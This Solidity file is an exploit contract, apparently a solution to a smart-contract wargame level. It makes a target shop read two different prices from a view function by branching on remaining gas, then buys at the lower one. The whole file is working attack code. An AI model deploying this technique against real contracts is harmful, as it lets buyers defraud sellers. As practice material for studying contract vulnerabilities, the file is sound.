// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IShop{
	function isSold() external returns (bool);
}

contract ShopExplit { // aka Buyer

//   bool public firstCall = true;

  uint threshold;
  function setThreshold(uint newThreshold) external {
    threshold = newThreshold;
  }

  function price() external view returns (uint){
	// i can still use global vars
	// block.timestamp
	/*
	bool currentValue = block.timestamp % 2 == 0;
	uint result = currentValue ? 200 : 0;
	// wait 1 sec ?	
	while(
		currentValue && block.timestamp % 2 == 0 ||
		!currentValue && block.timestamp % 2 == 1
	){}
	*/
	// => block.timestamp does not change

	// random, i have to check the gas consumed before the next call
	// if it is uneven this will work
	// uint result = (gasleft()) % 2 == 0 ? 200 : 0;

	// uint gasUsed = block.gaslimit - gasleft();

	uint result = gasleft() > threshold ? 150 : 50;
    return result;
  }

  /**
  * gasSent = 100_000
  * fromThreshold = 100_000
  * toThreshold = 90_000
  * decThreshold = 5
   */
  function callBuy(
	address shopAddress,
	uint gasSent,
	uint fromThreshold,
	uint toThreshold,
	uint decThreshold
  ) external returns(uint) {
	IShop shop = IShop(shopAddress);

	for(uint i = fromThreshold; i > toThreshold; i-= decThreshold){
		threshold = i;
		shopAddress.call{ gas:gasSent }(abi.encodePacked(keccak256("buy()")));

		if(shop.isSold()){
			return i;
		}
	}
	return type(uint256).max;
  }
}